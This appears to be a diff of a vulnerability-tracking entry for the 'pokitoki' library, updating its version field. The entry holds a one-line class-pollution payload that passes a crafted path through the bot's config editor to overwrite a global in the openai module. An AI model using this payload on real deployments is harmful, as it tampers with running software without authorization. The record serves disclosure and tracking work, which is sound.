@@ -4,7 +4,7 @@
 
 + Library: pokitoki
 + Stars: 315
-+ Version: N/A
++ Version: v210
 + CVE: N/A
 + Status: Pending
 + Payload: ```bot.config.ConfigEditor.set_value("openai.__init__.__globals__.__name__", "polluted")```
